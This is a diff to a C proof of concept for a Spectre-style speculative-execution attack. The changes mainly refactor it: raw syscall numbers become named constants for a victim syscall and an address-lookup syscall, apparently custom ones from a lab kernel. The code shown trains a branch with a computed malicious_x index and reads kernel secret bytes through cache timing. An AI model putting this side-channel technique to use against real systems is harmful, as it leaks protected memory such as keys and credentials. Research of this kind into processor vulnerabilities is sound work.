@@ -16,10 +16,12 @@
 #define ARRAY1_SIZE 16
 #define ARRAY2_SIZE NUM_CH * PAGE_SIZE
 
-
-uint8_t* arr2;
+#define SYS_CALL_VICTIM 223
+#define SYS_CALL_ADDR 224
 
 #define CACHE_HIT_THRESHOLD (100)
+
+uint8_t* arr2;
 
 void readMemoryByte(uint8_t value[2], int score[2], size_t malicious_x, uint8_t* karr2){
     static int results[NUM_CH];
@@ -42,7 +44,7 @@ void readMemoryByte(uint8_t value[2], int score[2], size_t malicious_x, uint8_t*
             x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
             x = training_x ^ (x & (malicious_x ^ training_x));
             // Sceptre
-            syscall(223, x, karr2);
+            syscall(SYS_CALL_VICTIM, x, karr2);
         }
 
        for (i = 0; i < NUM_CH; i++) {
@@ -75,8 +77,7 @@ void readMemoryByte(uint8_t value[2], int score[2], size_t malicious_x, uint8_t*
     score[1] = results[k];
 }
 
-int main(int argc, const char **argv)
-{
+int main(int argc, const char **argv) {
     int i;
     int score[2], len = 40;
     uint8_t value[2];
@@ -113,8 +114,8 @@ int main(int argc, const char **argv)
 		arr2[i] = 1;	
 	}
 
-    karr1 = (uint8_t*)syscall(224, 0);
-  	secret_ker_vir = (uint8_t*)syscall(224, secret_phy_addr);
+    karr1 = (uint8_t*)syscall(SYS_CALL_ADDR, 0); // 0 for getting array1's addr in kernel
+  	secret_ker_vir = (uint8_t*)syscall(SYS_CALL_ADDR, secret_phy_addr);
 
     malicious_x = secret_ker_vir - karr1;
 	
